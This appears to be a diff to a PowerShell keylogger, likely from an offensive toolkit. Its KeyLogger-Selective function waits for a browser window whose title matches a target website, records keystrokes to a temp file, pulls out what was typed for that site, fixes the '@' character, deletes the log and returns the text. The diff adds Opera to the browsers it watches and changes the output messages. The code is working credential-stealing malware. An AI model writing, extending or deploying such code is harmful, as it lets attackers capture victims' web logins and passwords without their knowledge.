@@ -381,13 +381,13 @@ function Get-Keystrokes {
 function KeyLogger-Selective {
 param ([string]$target)
 $ErrorActionPreference = "SilentlyContinue"
-$siempre = $true; write-host Executed for $target
-function credenciales_web {return (Get-Process firefox,chrome,iexplore | Where-Object {$_.MainWindowTitle -like "*$target*"}).id }
+$siempre = $true
+function credenciales_web {return (Get-Process firefox,chrome,iexplore,opera | Where-Object {$_.MainWindowTitle -like "*$target*"}).id }
 do{ $ruta = "$($env:TEMP)\key.log"  ; $id = credenciales_web 
 if ($id -ne $null ) { Get-Keystrokes -logpath $ruta -Timeout 1 ; $siempre = $false; sleep -Seconds 30 }
 $datos = gc $ruta ; $datos = $datos | Select-String $Target ; $texto = $datos} while ($siempre -eq $true) $extraido = "" ; $i = 0
 foreach ($dato in $datos) { $i = $i + 1 
 $dato = $dato -split "," ; $dato = $dato[0] ; $dato = $dato -replace '"',""; $dato = $dato -replace "TypedKey" ; $extraido += $dato -replace "","" 
-if ($i -eq $datos.Count) {$texto = "KeyLogger-Selective $target`n";$extraido = $extraido -replace "<Ctrl><Alt>2", "@"; $extraido = $extraido -replace "<Alt>",""
-$texto += $extraido
-Remove-Item $ruta ;return $extraido}}}
+if ($i -eq $datos.Count) {$extraido = $extraido -replace "<Ctrl><Alt>2", "@"; $extraido = $extraido -replace "<Alt>",""
+$executed = "Keylogger executed for the web $target :`n"; $executed += $extraido
+Remove-Item $ruta ;write-host "Target $target ";return $executed}}}
